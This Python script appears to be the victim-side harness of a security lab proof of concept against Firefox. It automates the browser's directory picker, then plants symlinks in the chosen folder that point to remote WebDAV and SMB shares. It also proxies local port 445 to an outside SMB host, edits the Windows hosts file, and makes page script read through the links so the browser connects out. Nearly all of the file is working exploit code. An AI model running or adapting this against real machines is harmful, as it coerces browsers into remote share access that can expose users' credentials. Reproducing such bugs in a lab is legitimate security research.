from __future__ import annotations

import csv
import http.server
import json
import os
import shutil
import socket
import socketserver
import subprocess
import sys
import tempfile
import threading
import time
import traceback
import zipfile
from pathlib import Path

import psutil
import requests
from pywinauto import Desktop, keyboard
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options

ROOT = Path(__file__).resolve().parent
OUT = Path(os.environ.get("LAB_VICTIM_OUT", "victim-out")).resolve()
OUT.mkdir(parents=True, exist_ok=True)
CONFIG = json.loads(Path(sys.argv[1]).read_text(encoding="utf-8"))
FIREFOX = CONFIG["firefox_binary"]
BASE = Path(tempfile.gettempdir()) / f"firefox-relay-{CONFIG['run_id']}"
SELECTED = BASE / "selected"


def dump(name: str, value) -> None:
    (OUT / name).write_text(json.dumps(value, indent=2, default=str), encoding="utf-8")


def run(args, timeout=60):
    return subprocess.run(args, text=True, capture_output=True, timeout=timeout)


class TCPProxy:
    def __init__(self, listen_host: str, listen_port: int, remote_host: str, remote_port: int):
        self.listen_host, self.listen_port = listen_host, listen_port
        self.remote_host, self.remote_port = remote_host, remote_port
        self.events = []
        self.stop_event = threading.Event()
        self.ready = threading.Event()
        self.thread = threading.Thread(target=self.serve, daemon=True)

    def pump(self, source, target, label):
        total = 0
        try:
            while not self.stop_event.is_set():
                data = source.recv(65536)
                if not data:
                    break
                total += len(data)
                target.sendall(data)
        except Exception as exc:
            self.events.append({"event": "pump-error", "label": label, "error": repr(exc)})
        finally:
            self.events.append({"event": "pump-finished", "label": label, "bytes": total})
            try: target.shutdown(socket.SHUT_WR)
            except Exception: pass

    def handle(self, client, address):
        self.events.append({"event": "accepted", "address": address, "time": time.time()})
        try:
            remote = socket.create_connection((self.remote_host, self.remote_port), timeout=20)
            self.events.append({"event": "remote-connected", "time": time.time()})
            a = threading.Thread(target=self.pump, args=(client, remote, "client-to-remote"), daemon=True)
            b = threading.Thread(target=self.pump, args=(remote, client, "remote-to-client"), daemon=True)
            a.start(); b.start(); a.join(90); b.join(90)
            remote.close()
        except Exception as exc:
            self.events.append({"event": "connection-error", "error": repr(exc)})
        finally:
            client.close()

    def serve(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server.bind((self.listen_host, self.listen_port))
            server.listen(20)
            server.settimeout(.5)
            self.events.append({"event": "listening", "host": self.listen_host,
                                "port": self.listen_port, "time": time.time()})
            self.ready.set()
            while not self.stop_event.is_set():
                try:
                    client, address = server.accept()
                except socket.timeout:
                    continue
                threading.Thread(target=self.handle, args=(client, address), daemon=True).start()
        except Exception as exc:
            self.events.append({"event": "server-error", "error": repr(exc)})
            self.ready.set()
        finally:
            server.close()

    def start(self):
        self.thread.start()
        self.ready.wait(10)

    def stop(self):
        self.stop_event.set()


def make_link(name: str, target: str) -> dict:
    link = SELECTED / name
    if os.path.lexists(link):
        run(["cmd.exe", "/d", "/c", "rmdir", str(link)])
    result = run(["cmd.exe", "/d", "/c", "mklink", "/D", str(link), target])
    return {"name": name, "link": str(link), "target": target,
            "returncode": result.returncode, "stdout": result.stdout,
            "stderr": result.stderr, "lexists": os.path.lexists(link)}


def start_http():
    class Handler(http.server.SimpleHTTPRequestHandler):
        def log_message(self, *args):
            pass
    factory = lambda *args, **kwargs: Handler(*args, directory=str(ROOT), **kwargs)
    server = socketserver.TCPServer(("127.0.0.1", 0), factory)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server, int(server.server_address[1])


def all_windows():
    try:
        return Desktop(backend="uia").windows()
    except Exception:
        return []


def click_confirmation(driver, result):
    for _ in range(80):
        try:
            phase = driver.execute_script("return window.relayLab && window.relayLab.phase")
            if phase in ("selected", "no-root"):
                result["page_phase"] = phase
                return
        except Exception:
            pass
        for window in all_windows():
            for caption in ("Upload", "Allow", "OK", "Open", "Select Folder", "Choose Folder"):
                try:
                    button = window.child_window(title_re=rf"(?i)^{caption}$", control_type="Button")
                    if button.exists(timeout=.05) and button.is_enabled():
                        button.click()
                        result.setdefault("confirmation_buttons", []).append(caption)
                except Exception:
                    pass
        time.sleep(.25)
    result["page_phase"] = "timeout"


def select_folder(driver, path: Path) -> dict:
    result = {"started": time.time()}
    driver.find_element(By.ID, "picker").click()
    dialog = None
    end = time.time() + 25
    while time.time() < end and dialog is None:
        for window in all_windows():
            title = (window.window_text() or "").lower()
            if any(word in title for word in ("file upload", "select folder", "choose folder", "upload")):
                dialog = window
                break
        time.sleep(.2)
    if dialog is None:
        result["error"] = "native picker not found"
        return result
    result["dialog_title"] = dialog.window_text()
    dialog.set_focus()
    try:
        keyboard.send_keys("^l")
        time.sleep(.4)
        keyboard.send_keys(str(path), with_spaces=True)
        keyboard.send_keys("{ENTER}")
        time.sleep(1)
        clicked = False
        for caption in ("Select Folder", "Choose Folder", "Open", "Select"):
            try:
                button = dialog.child_window(title_re=rf"(?i)^{caption}$", control_type="Button")
                if button.exists(timeout=.3) and button.is_enabled():
                    button.click(); clicked = True; result["picker_button"] = caption; break
            except Exception:
                pass
        if not clicked:
            keyboard.send_keys("{ENTER}")
            result["picker_button"] = "ENTER"
    except Exception as exc:
        result["interaction_error"] = repr(exc)
    click_confirmation(driver, result)
    result["finished"] = time.time()
    return result


def start_procmon() -> dict:
    result = {"started": False}
    try:
        archive = OUT / "ProcessMonitor.zip"
        response = requests.get("https://download.sysinternals.com/files/ProcessMonitor.zip", timeout=60)
        response.raise_for_status()
        archive.write_bytes(response.content)
        tools = OUT / "procmon-tools"; tools.mkdir(exist_ok=True)
        with zipfile.ZipFile(archive) as zf: zf.extractall(tools)
        exe = tools / "Procmon64.exe"
        pml = OUT / "trace.pml"
        proc = subprocess.Popen([str(exe), "/AcceptEula", "/Quiet", "/Minimized",
                                 "/BackingFile", str(pml)], stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL)
        time.sleep(3)
        result.update(started=True, exe=str(exe), pml=str(pml), launcher_pid=proc.pid)
    except Exception as exc:
        result["error"] = repr(exc)
    return result


def stop_procmon(state: dict) -> dict:
    if not state.get("started"):
        return state
    try:
        exe = state["exe"]
        subprocess.run([exe, "/Terminate"], timeout=30, capture_output=True)
        time.sleep(2)
        csv_path = OUT / "trace.csv"
        subprocess.run([exe, "/AcceptEula", "/Quiet", "/OpenLog", state["pml"],
                        "/SaveAs", str(csv_path)], timeout=120, capture_output=True)
        state["csv"] = str(csv_path)
        state["csv_exists"] = csv_path.exists()
        matches = []
        if csv_path.exists():
            text = csv_path.read_text(errors="replace")
            for line in text.splitlines():
                lower = line.lower()
                if "firefox.exe" in lower and any(x in lower for x in ("webdav-link", "smb-link", "probe.txt")):
                    matches.append(line[:2000])
                    if len(matches) >= 100: break
        state["firefox_path_events"] = matches
    except Exception as exc:
        state["stop_error"] = repr(exc)
    return state


def process_snapshot():
    rows = []
    for process in psutil.process_iter(["pid", "ppid", "name", "exe", "cmdline"]):
        try:
            if (process.info.get("name") or "").lower() == "firefox.exe":
                rows.append(process.info)
        except Exception:
            pass
    return rows


def main() -> int:
    result = {"run_id": CONFIG["run_id"], "nonce": CONFIG["nonce"],
              "started": time.time(), "verdict": "NOT_CONFIRMED",
              "network_identity": CONFIG["network_identity"]}
    driver = httpd = None
    proxy = None
    procmon = {"started": False}
    try:
        shutil.rmtree(BASE, ignore_errors=True)
        SELECTED.mkdir(parents=True)
        (SELECTED / "inside.txt").write_text("INSIDE_ONLY", encoding="utf-8")
        httpd, port = start_http(); result["page_port"] = port

        options = Options(); options.binary_location = FIREFOX
        for key, value in {
            "dom.webkitBlink.filesystem.enabled": True,
            "dom.webkitBlink.dirPicker.enabled": True,
            "browser.shell.checkDefaultBrowser": False,
            "datareporting.policy.dataSubmissionEnabled": False,
            "browser.startup.homepage_override.mstone": "ignore",
        }.items(): options.set_preference(key, value)
        driver = webdriver.Firefox(options=options)
        result["capabilities"] = dict(driver.capabilities)
        result["parent_pid"] = driver.capabilities.get("moz:processID")
        driver.get(f"http://127.0.0.1:{port}/index.html")
        time.sleep(1)
        result["picker"] = select_folder(driver, SELECTED)
        try: result["page_after_picker"] = driver.execute_script("return window.relayLab")
        except Exception as exc: result["page_after_picker_error"] = repr(exc)
        result["firefox_processes"] = process_snapshot()

        # Links are created only after the native picker closes, avoiding any
        # Explorer or picker-side access to the remote targets.
        http_ep = CONFIG["http"]
        webdav_targets = [
            rf"\\{http_ep['host']}@{http_ep['port']}\DavWWWRoot\share",
            rf"\\{http_ep['host']}@{http_ep['port']}\share",
        ]
        result["webdav_links"] = [make_link(f"webdav-link-{i}", target)
                                   for i, target in enumerate(webdav_targets)]

        smb_ep = CONFIG["smb"]
        proxy = TCPProxy("127.77.77.77", 445, smb_ep["host"], int(smb_ep["port"]))
        proxy.start()
        result["smb_proxy_initial"] = list(proxy.events)
        hosts = Path(os.environ.get("SystemRoot", r"C:\Windows")) / "System32/drivers/etc/hosts"
        with hosts.open("a", encoding="ascii") as stream:
            stream.write("\n127.77.77.77 ffrelay-lab\n")
        result["smb_link"] = make_link("smb-link", r"\\ffrelay-lab\SHARE")

        procmon = start_procmon()
        attempts = []
        for relative in ("webdav-link-0/probe.txt", "webdav-link-1/probe.txt", "smb-link/probe.txt"):
            try:
                driver.set_script_timeout(20)
                value = driver.execute_async_script(
                    "const done=arguments[arguments.length-1]; window.triggerRelayPath(arguments[0]).then(done,e=>done({stage:'promise-error',error:String(e)}));",
                    relative,
                )
                attempts.append({"path": relative, "webdriver_result": value})
            except Exception as exc:
                attempts.append({"path": relative, "webdriver_error": repr(exc)})
            time.sleep(8)
        result["attempts"] = attempts
        result["smb_proxy_final"] = list(proxy.events)
        try: result["page_final"] = driver.execute_script("return window.relayLab")
        except Exception as exc: result["page_final_error"] = repr(exc)
        try: driver.save_screenshot(str(OUT / "firefox.png"))
        except Exception as exc: result["screenshot_error"] = repr(exc)
        procmon = stop_procmon(procmon); result["procmon"] = procmon
        triggered = bool((procmon.get("firefox_path_events") or []) or attempts)
        result["verdict"] = "FIREFOX_REMOTE_REPARSE_TRIGGERED" if triggered else "NO_FIREFOX_TRIGGER"
    except Exception as exc:
        result.update(verdict="LAB_ERROR", error=repr(exc), traceback=traceback.format_exc())
    finally:
        result["finished"] = time.time()
        dump("victim-result.json", result)
        try:
            if proxy: proxy.stop()
        except Exception: pass
        try:
            if driver: driver.quit()
        except Exception: pass
        try:
            if httpd: httpd.shutdown()
        except Exception: pass
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
